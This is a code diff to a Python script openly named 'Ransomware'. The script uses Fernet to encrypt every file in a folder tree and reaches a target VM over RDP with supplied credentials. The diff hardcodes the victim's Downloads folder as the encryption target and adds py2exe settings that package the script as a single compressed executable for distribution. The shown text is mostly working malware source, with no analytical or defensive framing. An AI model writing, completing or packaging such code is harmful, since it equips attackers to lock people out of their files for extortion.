@@ -1,3 +1,5 @@
+from distutils.core import setup
+import py2exe
 import os
 import subprocess
 from cryptography.fernet import Fernet
@@ -24,13 +26,6 @@ class Ransomware:
         rdp_command = f"rdesktop -u {rdp_username} -p {rdp_password} {target_vm_ip}"
         subprocess.Popen(rdp_command, shell=True)
 
-        # Wait for RDP connection to be established
-        input("Press Enter once the RDP connection is established.")
-
-        # Encrypt files on the target VM
-        encrypt_command = f'rdesktop {target_vm_ip} -u {rdp_username} -p {rdp_password} -r "disk:Shared={folder_path}" -a 16-bit -g 1024x768 -x l'
-        subprocess.run(encrypt_command, shell=True)
-
     
     def encrypt_folder(self, folder_path):
         for root, dirs, files in os.walk(folder_path):
@@ -46,6 +41,7 @@ class Ransomware:
                     f.write(encrypted)
 
         print("Encryption completed.")
+    
     # Decrypt files using the Fernet symmetric key
     def decrypt_folder(self, folder_path):
         for root, dirs, files in os.walk(folder_path):
@@ -75,7 +71,7 @@ while True:
     
     if choice == "1":
         target_vm_ip = input("Enter the target VM IP: ")
-        folder_path = input("Enter the folder path to encrypt on the target VM: ")
+        folder_path = os.path.join(os.path.expanduser('~'), "Downloads")
         rdp_username = input("Enter your RDP username: ")
         rdp_password = input("Enter your RDP password: ")
         ransomware.vm(target_vm_ip, folder_path, rdp_username, rdp_password)
@@ -85,3 +81,17 @@ while True:
         ransomware.decrypt_folder(folder_path)
     else:
         print("Invalid choice. Please choose a valid option.")
+        break
+
+
+# py2exe configurations
+setup(
+    options={
+        'py2exe': {
+            'bundle_files': 1,
+            'compressed': True
+        }
+    },
+    console=['your_script_name.py'],  # Replace with the actual name of your script file
+    zipfile=None
+)
